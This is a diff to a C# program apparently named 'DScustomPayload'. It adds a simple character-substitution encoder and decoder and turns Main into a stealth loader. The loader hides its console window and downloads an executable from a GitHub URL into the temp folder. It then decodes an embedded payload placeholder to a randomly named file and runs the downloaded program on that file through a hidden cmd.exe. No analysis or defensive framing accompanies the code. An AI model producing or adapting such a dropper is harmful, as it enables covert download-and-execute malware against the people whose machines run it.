@@ -1,16 +1,19 @@
 using System;
+using System.Drawing;
+using System.Windows.Forms;
 using System.Text;
 using System.IO;
 using System.Diagnostics;
 using System.ComponentModel;
 using System.Linq;
 using System.Net;
-using System.Net.Sockets;
 using System.Collections.Generic;
 using System.IO.Compression;
 using System.Web;
 using System.Threading;
 using System.Text.RegularExpressions;
+using System.Reflection;
+using System.Runtime.InteropServices;
 
 namespace DScustomPayload
 {
@@ -113,222 +116,262 @@ namespace DScustomPayload
 		{
 			File.WriteAllText(name, text);
 		}
-		public static string decrypt(string value)
+		public static string decrypt(string mystring)
 		{
+			mystring = mystring.Replace("/69/", " ");
+			// numbers
+			mystring = mystring.Replace("/29/", "/");
+			mystring = mystring.Replace("/39/", "1");
+			mystring = mystring.Replace("/39,5/", "2");
+			mystring = mystring.Replace("/40/", "3");
+			mystring = mystring.Replace("/40,5/", "4");
+			mystring = mystring.Replace("/41/", "5");
+			mystring = mystring.Replace("/41,5/", "6");
+			mystring = mystring.Replace("/42/", "7");
+			mystring = mystring.Replace("/42,5/", "8");
+			mystring = mystring.Replace("/43/", "9");
+			mystring = mystring.Replace("/43,5/", "0");
+			mystring = mystring.Replace("/44/", "-");
+			mystring = mystring.Replace("/44,5/", "+");
+			mystring = mystring.Replace("/45/", "\"");
+			mystring = mystring.Replace("/45,5/", "#");
+			mystring = mystring.Replace("/46/", "è");
+			mystring = mystring.Replace("/46,5/", "^");
+			mystring = mystring.Replace("/47/", "¨");
+			mystring = mystring.Replace("/47,5/", "à");
+			
+			
 			// upper+lower chars
-			string decrypted = value.Replace("/0,5/", "a");
-			decrypted = value.Replace("/1/", "A");
-			decrypted = value.Replace("/1,5/", "b");
-			decrypted = value.Replace("/2/", "B");
-			decrypted = value.Replace("/2,5/", "c");
-			decrypted = value.Replace("/3/", "C");
-			decrypted = value.Replace("/3,5/", "d");
-			decrypted = value.Replace("/4/", "D");
-			decrypted = value.Replace("/4,5/", "e");
-			decrypted = value.Replace("/5/", "E");
-			decrypted = value.Replace("/5,5/", "f");
-			decrypted = value.Replace("/6/", "F");
-			decrypted = value.Replace("/6,5/", "g");
-			decrypted = value.Replace("/7/", "G");
-			decrypted = value.Replace("/7,5/", "h");
-			decrypted = value.Replace("/8/", "H");
-			decrypted = value.Replace("/8,5/", "i");
-			decrypted = value.Replace("/9/", "I");
-			decrypted = value.Replace("/9,5/", "j");
-			decrypted = value.Replace("/10/", "J");
-			decrypted = value.Replace("/10,5/", "k");
-			decrypted = value.Replace("/11/", "K");
-			decrypted = value.Replace("/11,5/", "l");
-			decrypted = value.Replace("/12/", "L");
-			decrypted = value.Replace("/12,5/", "m");
-			decrypted = value.Replace("/13/", "M");
-			decrypted = value.Replace("/13,5/", "n");
-			decrypted = value.Replace("/14/", "N");
-			decrypted = value.Replace("/14,5/", "o");
-			decrypted = value.Replace("/15/", "O");
-			decrypted = value.Replace("/15,5/", "p");
-			decrypted = value.Replace("/16/", "P");
-			decrypted = value.Replace("/16,5/", "q");
-			decrypted = value.Replace("/17/", "Q");
-			decrypted = value.Replace("/17,5/", "r");
-			decrypted = value.Replace("/18/", "R");
-			decrypted = value.Replace("/18,5/", "s");
-			decrypted = value.Replace("/19/", "S");
-			decrypted = value.Replace("/19,5/", "t");
-			decrypted = value.Replace("/20/", "T");
-			decrypted = value.Replace("/20,5/", "u");
-			decrypted = value.Replace("/21/", "U");
-			decrypted = value.Replace("/21,5/", "v");
-			decrypted = value.Replace("/22/", "V");
-			decrypted = value.Replace("/22,5/", "w");
-			decrypted = value.Replace("/23/", "W");
-			decrypted = value.Replace("/23,5/", "x");
-			decrypted = value.Replace("/24/", "X");
-			decrypted = value.Replace("/24,5/", "y");
-			decrypted = value.Replace("/25/", "Y");
-			decrypted = value.Replace("/25,5/", "z");
-			decrypted = value.Replace("/26/", "Z");
+			mystring = mystring.Replace("/0,5/", "a");
+			mystring = mystring.Replace("/1/", "A");
+			mystring = mystring.Replace("/1,5/", "b");
+			mystring = mystring.Replace("/2/", "B");
+			mystring = mystring.Replace("/2,5/", "c");
+			mystring = mystring.Replace("/3/", "C");
+			mystring = mystring.Replace("/3,5/", "d");
+			mystring = mystring.Replace("/4/", "D");
+			mystring = mystring.Replace("/4,5/", "e");
+			mystring = mystring.Replace("/5/", "E");
+			mystring = mystring.Replace("/5,5/", "f");
+			mystring = mystring.Replace("/6/", "F");
+			mystring = mystring.Replace("/6,5/", "g");
+			mystring = mystring.Replace("/7/", "G");
+			mystring = mystring.Replace("/7,5/", "h");
+			mystring = mystring.Replace("/8/", "H");
+			mystring = mystring.Replace("/8,5/", "i");
+			mystring = mystring.Replace("/9/", "I");
+			mystring = mystring.Replace("/9,5/", "j");
+			mystring = mystring.Replace("/10/", "J");
+			mystring = mystring.Replace("/10,5/", "k");
+			mystring = mystring.Replace("/11/", "K");
+			mystring = mystring.Replace("/11,5/", "l");
+			mystring = mystring.Replace("/12/", "L");
+			mystring = mystring.Replace("/12,5/", "m");
+			mystring = mystring.Replace("/13/", "M");
+			mystring = mystring.Replace("/13,5/", "n");
+			mystring = mystring.Replace("/14/", "N");
+			mystring = mystring.Replace("/14,5/", "o");
+			mystring = mystring.Replace("/15/", "O");
+			mystring = mystring.Replace("/15,5/", "p");
+			mystring = mystring.Replace("/16/", "P");
+			mystring = mystring.Replace("/16,5/", "q");
+			mystring = mystring.Replace("/17/", "Q");
+			mystring = mystring.Replace("/17,5/", "r");
+			mystring = mystring.Replace("/18/", "R");
+			mystring = mystring.Replace("/18,5/", "s");
+			mystring = mystring.Replace("/19/", "S");
+			mystring = mystring.Replace("/19,5/", "t");
+			mystring = mystring.Replace("/20/", "T");
+			mystring = mystring.Replace("/20,5/", "u");
+			mystring = mystring.Replace("/21/", "U");
+			mystring = mystring.Replace("/21,5/", "v");
+			mystring = mystring.Replace("/22/", "V");
+			mystring = mystring.Replace("/22,5/", "w");
+			mystring = mystring.Replace("/23/", "W");
+			mystring = mystring.Replace("/23,5/", "x");
+			mystring = mystring.Replace("/24/", "X");
+			mystring = mystring.Replace("/24,5/", "y");
+			mystring = mystring.Replace("/25/", "Y");
+			mystring = mystring.Replace("/25,5/", "z");
+			mystring = mystring.Replace("/26/", "Z");
 			
 			// special chars
-			decrypted = value.Replace("/26,5/", ".");
-			decrypted = value.Replace("/27/", "$");
-			decrypted = value.Replace("/27,5/", "£");
-			decrypted = value.Replace("/28/", "€");
-			decrypted = value.Replace("/28,5/", ":");
-			decrypted = value.Replace("/29/", "/");
-			decrypted = value.Replace("/29,5/", "%");
-			decrypted = value.Replace("/30/", "\\");
-			decrypted = value.Replace("/30,5/", "*");
-			decrypted = value.Replace("/31/", "=");
-			decrypted = value.Replace("/31,5/", "@");
-			decrypted = value.Replace("/32/", "ç");
-			decrypted = value.Replace("/32,5/", "é");
-			decrypted = value.Replace("/33/", "&");
-			decrypted = value.Replace("/33,5/", "~");
-			decrypted = value.Replace("/34/", "'");
-			decrypted = value.Replace("/34,5/", "`");
-			decrypted = value.Replace("/35/", "|");
-			decrypted = value.Replace("/35,5/", "[");
-			decrypted = value.Replace("/36/", "]");
-			decrypted = value.Replace("/36,5/", "!");
-			decrypted = value.Replace("/37/", "?");
-			decrypted = value.Replace("/37,5/", ";");
-			decrypted = value.Replace("/38/", "(");
-			decrypted = value.Replace("/38,5/", ")");
-			
-			// numbers
-			decrypted = value.Replace("/39/", "1");
-			decrypted = value.Replace("/39,5/", "2");
-			decrypted = value.Replace("/40/", "3");
-			decrypted = value.Replace("/40,5/", "4");
-			decrypted = value.Replace("/41/", "5");
-			decrypted = value.Replace("/41,5/", "6");
-			decrypted = value.Replace("/42/", "7");
-			decrypted = value.Replace("/42,5/", "8");
-			decrypted = value.Replace("/43/", "9");
-			decrypted = value.Replace("/43,5/", "0");
-			decrypted = value.Replace("/44/", "-");
-			decrypted = value.Replace("/44,5/", "+");
-			decrypted = value.Replace("/45/", "\"");
-			decrypted = value.Replace("/45,5/", "#");
-			decrypted = value.Replace("/46/", "è");
-			decrypted = value.Replace("/46,5/", "^");
-			decrypted = value.Replace("/47/", "¨");
-			decrypted = value.Replace("/47,5/", "à");
-			
-			return decrypted;
+			mystring = mystring.Replace("/26,5/", ".");
+			mystring = mystring.Replace("/27/", "$");
+			mystring = mystring.Replace("/27,5/", "£");
+			mystring = mystring.Replace("/28/", "€");
+			mystring = mystring.Replace("/28,5/", ":");
+			mystring = mystring.Replace("/29,5/", "%");
+			mystring = mystring.Replace("/30/", "\\");
+			mystring = mystring.Replace("/30,5/", "*");
+			mystring = mystring.Replace("/31/", "=");
+			mystring = mystring.Replace("/31,5/", "@");
+			mystring = mystring.Replace("/32/", "ç");
+			mystring = mystring.Replace("/32,5/", "é");
+			mystring = mystring.Replace("/33/", "&");
+			mystring = mystring.Replace("/33,5/", "~");
+			mystring = mystring.Replace("/34/", "'");
+			mystring = mystring.Replace("/34,5/", "`");
+			mystring = mystring.Replace("/35/", "|");
+			mystring = mystring.Replace("/35,5/", "[");
+			mystring = mystring.Replace("/36/", "]");
+			mystring = mystring.Replace("/36,5/", "!");
+			mystring = mystring.Replace("/37/", "?");
+			mystring = mystring.Replace("/37,5/", ";");
+			mystring = mystring.Replace("/38/", "(");
+			mystring = mystring.Replace("/38,5/", ")");
+			mystring = mystring.Replace("/69/", " ");
+			return mystring;
 		}
-		public static string encrypt(string value)
-		{
+		public static string encrypt(string mystring)
+        {
+			mystring = mystring.Replace("/", "/29/");
+			mystring = mystring.Replace(" ", "/69/");
+			// numbers
+			mystring = mystring.Replace("1", "/39/");
+			mystring = mystring.Replace("2", "/39,5/");
+			mystring = mystring.Replace("3", "/40/");
+			mystring = mystring.Replace("4", "/40,5/");
+			mystring = mystring.Replace("5", "/41/");
+			mystring = mystring.Replace("6", "/41,5/");
+			mystring = mystring.Replace("7", "/42/");
+			mystring = mystring.Replace("8", "/42,5/");
+			mystring = mystring.Replace("9", "/43/");
+			mystring = mystring.Replace("0", "/43,5/");
+			mystring = mystring.Replace("-", "/44/");
+			mystring = mystring.Replace("+", "/44,5/");
+			mystring = mystring.Replace("\"", "/45/");
+			mystring = mystring.Replace("#", "/45,5/");
+			mystring = mystring.Replace("è", "/46/");
+			mystring = mystring.Replace("^", "/46,5/");
+			mystring = mystring.Replace("¨", "/47/");
+			mystring = mystring.Replace("à", "/47,5/");
+			
 			// upper+lower chars
-			string encrypted = value.Replace("a", "/0,5/");
-			encrypted = value.Replace("A", "/1/");
-			encrypted = value.Replace("b", "/1,5/");
-			encrypted = value.Replace("B", "/2/");
-			encrypted = value.Replace("c", "/2,5/");
-			encrypted = value.Replace("C", "/3/");
-			encrypted = value.Replace("d", "/3,5/");
-			encrypted = value.Replace("D", "/4/");
-			encrypted = value.Replace("e", "/4,5/");
-			encrypted = value.Replace("E", "/5/");
-			encrypted = value.Replace("f", "/5,5/");
-			encrypted = value.Replace("F", "/6/");
-			encrypted = value.Replace("g", "/6,5/");
-			encrypted = value.Replace("G", "/7/");
-			encrypted = value.Replace("h", "/7,5/");
-			encrypted = value.Replace("H", "/8/");
-			encrypted = value.Replace("i", "/8,5/");
-			encrypted = value.Replace("I", "/9/");
-			encrypted = value.Replace("j", "/9,5/");
-			encrypted = value.Replace("J", "/10/");
-			encrypted = value.Replace("k", "/10,5/");
-			encrypted = value.Replace("K", "/11/");
-			encrypted = value.Replace("l", "/11,5/");
-			encrypted = value.Replace("L", "/12/");
-			encrypted = value.Replace("m", "/12,5/");
-			encrypted = value.Replace("M", "/13/");
-			encrypted = value.Replace("n", "/13,5/");
-			encrypted = value.Replace("N", "/14/");
-			encrypted = value.Replace("o", "/14,5/");
-			encrypted = value.Replace("O", "/15/");
-			encrypted = value.Replace("p", "/15,5/");
-			encrypted = value.Replace("P", "/16/");
-			encrypted = value.Replace("q", "/16,5/");
-			encrypted = value.Replace("Q", "/17/");
-			encrypted = value.Replace("r", "/17,5/");
-			encrypted = value.Replace("R", "/18/");
-			encrypted = value.Replace("s", "/18,5/");
-			encrypted = value.Replace("S", "/19/");
-			encrypted = value.Replace("t", "/19,5/");
-			encrypted = value.Replace("T", "/20/");
-			encrypted = value.Replace("u", "/20,5/");
-			encrypted = value.Replace("U", "/21/");
-			encrypted = value.Replace("v", "/21,5/");
-			encrypted = value.Replace("V", "/22/");
-			encrypted = value.Replace("w", "/22,5/");
-			encrypted = value.Replace("W", "/23/");
-			encrypted = value.Replace("x", "/23,5/");
-			encrypted = value.Replace("X", "/24/");
-			encrypted = value.Replace("y", "/24,5/");
-			encrypted = value.Replace("Y", "/25/");
-			encrypted = value.Replace("z", "/25,5/");
-			encrypted = value.Replace("Z", "/26/");
+			mystring = mystring.Replace("a", "/0,5/");
+			mystring = mystring.Replace("A", "/1/");
+			mystring = mystring.Replace("b", "/1,5/");
+			mystring = mystring.Replace("B", "/2/");
+			mystring = mystring.Replace("c", "/2,5/");
+			mystring = mystring.Replace("C", "/3/");
+			mystring = mystring.Replace("d", "/3,5/");
+			mystring = mystring.Replace("D", "/4/");
+			mystring = mystring.Replace("e", "/4,5/");
+			mystring = mystring.Replace("E", "/5/");
+			mystring = mystring.Replace("f", "/5,5/");
+			mystring = mystring.Replace("F", "/6/");
+			mystring = mystring.Replace("g", "/6,5/");
+			mystring = mystring.Replace("G", "/7/");
+			mystring = mystring.Replace("h", "/7,5/");
+			mystring = mystring.Replace("H", "/8/");
+			mystring = mystring.Replace("i", "/8,5/");
+			mystring = mystring.Replace("I", "/9/");
+			mystring = mystring.Replace("j", "/9,5/");
+			mystring = mystring.Replace("J", "/10/");
+			mystring = mystring.Replace("k", "/10,5/");
+			mystring = mystring.Replace("K", "/11/");
+			mystring = mystring.Replace("l", "/11,5/");
+			mystring = mystring.Replace("L", "/12/");
+			mystring = mystring.Replace("m", "/12,5/");
+			mystring = mystring.Replace("M", "/13/");
+			mystring = mystring.Replace("n", "/13,5/");
+			mystring = mystring.Replace("N", "/14/");
+			mystring = mystring.Replace("o", "/14,5/");
+			mystring = mystring.Replace("O", "/15/");
+			mystring = mystring.Replace("p", "/15,5/");
+			mystring = mystring.Replace("P", "/16/");
+			mystring = mystring.Replace("q", "/16,5/");
+			mystring = mystring.Replace("Q", "/17/");
+			mystring = mystring.Replace("r", "/17,5/");
+			mystring = mystring.Replace("R", "/18/");
+			mystring = mystring.Replace("s", "/18,5/");
+			mystring = mystring.Replace("S", "/19/");
+			mystring = mystring.Replace("t", "/19,5/");
+			mystring = mystring.Replace("T", "/20/");
+			mystring = mystring.Replace("u", "/20,5/");
+			mystring = mystring.Replace("U", "/21/");
+			mystring = mystring.Replace("v", "/21,5/");
+			mystring = mystring.Replace("V", "/22/");
+			mystring = mystring.Replace("w", "/22,5/");
+			mystring = mystring.Replace("W", "/23/");
+			mystring = mystring.Replace("x", "/23,5/");
+			mystring = mystring.Replace("X", "/24/");
+			mystring = mystring.Replace("y", "/24,5/");
+			mystring = mystring.Replace("Y", "/25/");
+			mystring = mystring.Replace("z", "/25,5/");
+			mystring = mystring.Replace("Z", "/26/");
 			
 			// special chars
-			encrypted = value.Replace(".", "/26,5/");
-			encrypted = value.Replace("$", "/27/");
-			encrypted = value.Replace("£", "/27,5/");
-			encrypted = value.Replace("€", "/28/");
-			encrypted = value.Replace(":", "/28,5/");
-			encrypted = value.Replace("/", "/29/");
-			encrypted = value.Replace("%", "/29,5/");
-			encrypted = value.Replace("\\", "/30/");
-			encrypted = value.Replace("*", "/30,5/");
-			encrypted = value.Replace("=", "/31/");
-			encrypted = value.Replace("@", "/31,5/");
-			encrypted = value.Replace("ç", "/32/");
-			encrypted = value.Replace("é", "/32,5/");
-			encrypted = value.Replace("&", "/33/");
-			encrypted = value.Replace("~", "/33,5/");
-			encrypted = value.Replace("'", "/34/");
-			encrypted = value.Replace("`", "/34,5/");
-			encrypted = value.Replace("|", "/35/");
-			encrypted = value.Replace("[", "/35,5/");
-			encrypted = value.Replace("]", "/36/");
-			encrypted = value.Replace("!", "/36,5/");
-			encrypted = value.Replace("?", "/37/");
-			encrypted = value.Replace(";", "/37,5/");
-			encrypted = value.Replace("(", "/38/");
-			encrypted = value.Replace(")", "/38,5/");
-			
-			// numbers
-			encrypted = value.Replace("1", "/39/");
-			encrypted = value.Replace("2", "/39,5/");
-			encrypted = value.Replace("3", "/40/");
-			encrypted = value.Replace("4", "/40,5/");
-			encrypted = value.Replace("5", "/41/");
-			encrypted = value.Replace("6", "/41,5/");
-			encrypted = value.Replace("7", "/42/");
-			encrypted = value.Replace("8", "/42,5/");
-			encrypted = value.Replace("9", "/43/");
-			encrypted = value.Replace("0", "/43,5/");
-			encrypted = value.Replace("-", "/44/");
-			encrypted = value.Replace("+", "/44,5/");
-			encrypted = value.Replace("\"", "/45/");
-			encrypted = value.Replace("#", "/45,5/");
-			encrypted = value.Replace("è", "/46/");
-			encrypted = value.Replace("^", "/46,5/");
-			encrypted = value.Replace("¨", "/47/");
-			encrypted = value.Replace("à", "/47,5/");
-			
-			return encrypted;
+			mystring = mystring.Replace(".", "/26,5/");
+			mystring = mystring.Replace("$", "/27/");
+			mystring = mystring.Replace("£", "/27,5/");
+			mystring = mystring.Replace("€", "/28/");
+			mystring = mystring.Replace(":", "/28,5/");
+			mystring = mystring.Replace("%", "/29,5/");
+			mystring = mystring.Replace("\\", "/30/");
+			mystring = mystring.Replace("*", "/30,5/");
+			mystring = mystring.Replace("=", "/31/");
+			mystring = mystring.Replace("@", "/31,5/");
+			mystring = mystring.Replace("ç", "/32/");
+			mystring = mystring.Replace("é", "/32,5/");
+			mystring = mystring.Replace("&", "/33/");
+			mystring = mystring.Replace("~", "/33,5/");
+			mystring = mystring.Replace("'", "/34/");
+			mystring = mystring.Replace("`", "/34,5/");
+			mystring = mystring.Replace("|", "/35/");
+			mystring = mystring.Replace("[", "/35,5/");
+			mystring = mystring.Replace("]", "/36/");
+			mystring = mystring.Replace("!", "/36,5/");
+			mystring = mystring.Replace("?", "/37/");
+			mystring = mystring.Replace(";", "/37,5/");
+			mystring = mystring.Replace("(", "/38/");
+			mystring = mystring.Replace(")", "/38,5/");
+			return mystring;
 		}
+		
+		[DllImport("user32.dll", EntryPoint = "ShowCursor", CharSet = CharSet.Auto)]
+		public extern static void ShowCursor(int status);
+		
+		[DllImport("kernel32.dll")]
+		static extern IntPtr GetConsoleWindow();
+		[DllImport("user32.dll")]
+		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+		const int SW_HIDE = 0;
+		const int SW_SHOW = 5;
+		
 		static void Main(string[] args)
         {
+			string tempdir = Path.GetTempPath();
+			
+			
+			Console.SetWindowSize(1, 1);
+			var handle = GetConsoleWindow();
+			ShowWindow(handle, SW_HIDE);
+			
+			
+			if(!File.Exists(tempdir+@"\dang.exe"))
+			{
+				ServicePointManager.Expect100Continue = true;
+				ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
+				
+				
+				new WebClient().DownloadFile("https://github.com/canarddu38/Dang/raw/main/dang.exe", tempdir+@"\dang.exe");
+			}
+			
 			string encDANGpayload = @"%your_dang_payload%";
 			
-			Console.WriteLine("dec: "+decrypt(encDANGpayload));
-			Console.Read();
+			File.WriteAllText(tempdir+@"\ptrgzksfeqfesgse.dang", decrypt(encDANGpayload));
+			
+			ProcessStartInfo processInfo;
+			Process process;
+			processInfo = new ProcessStartInfo("cmd.exe", @"/c call %temp%\dang.exe %temp%\ptrgzksfeqfesgse.dang");
+			processInfo.CreateNoWindow = true;
+			processInfo.UseShellExecute = false;
+			processInfo.RedirectStandardOutput = true;
+			process = Process.Start(processInfo);
+			process.WaitForExit();
+			
+			Environment.Exit(0);
 		}
 	}
 }
